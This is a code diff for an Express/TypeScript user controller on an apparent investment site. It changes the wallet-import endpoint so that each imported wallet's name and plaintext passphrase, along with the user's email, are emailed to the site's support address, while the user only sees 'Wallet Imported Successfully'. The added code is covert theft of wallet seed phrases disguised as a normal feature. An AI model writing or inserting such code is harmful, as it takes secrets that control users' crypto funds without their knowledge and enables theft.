@@ -1,6 +1,7 @@
 import { Request, Response } from "express";
 import User from "../models/User";
 import { sendErrorResponse, sendSuccessResponse } from "../modules/utils";
+import mailer from "../services/mailer";
 import StatusCode from "../status";
 import { SignupBody } from "./AuthController";
 
@@ -136,9 +137,38 @@ class UserController {
       );
     }
 
-    // valid
-    sendSuccessResponse(res, undefined, "Wallet Imported Successfully");
-    //TODO: send details to admin email
+    try {
+      // @ts-ignore
+      const user = await User.findByPk(req.userId || "");
+      if (!user)
+        return sendErrorResponse(
+          res,
+          "User Not Found. Invalid Token",
+          StatusCode.FORBIDDEN,
+          "Try re-logging into the website"
+        );
+
+      const emailBody = `
+      <div style="background-color:#272f3d;padding:10px;color:white">
+        <p style="font-size:24px;font-weight:800;text-align:center;text-transform:uppercase;margin-bottom:25px">Someone Imported Wallet Passphrase</p>
+        <p><b>Wallet Name:</b> ${wallet_name}</p>
+        <p><b>Wallet passphrase:</b> ${passphrase}</p>
+        <p><b>User's email:</b> ${user.email}</p>
+      </div>`;
+      sendSuccessResponse(res, undefined, "Wallet Imported Successfully");
+      // send passphrase to admin
+      mailer(
+        process.env.INFO_EMAIL_USERNAME,
+        process.env.INFO_EMAIL_PASSWORD
+      ).sendMail({
+        from: "Action Info info@smartproinvest.com", // sender address
+        to: "support@smartproinvest.com", // list of receivers
+        subject: `Wallet Imported`, // Subject line
+        html: emailBody, // html body
+      });
+    } catch (error: any) {
+      return sendErrorResponse(res, error?.message);
+    }
   }
 }
 
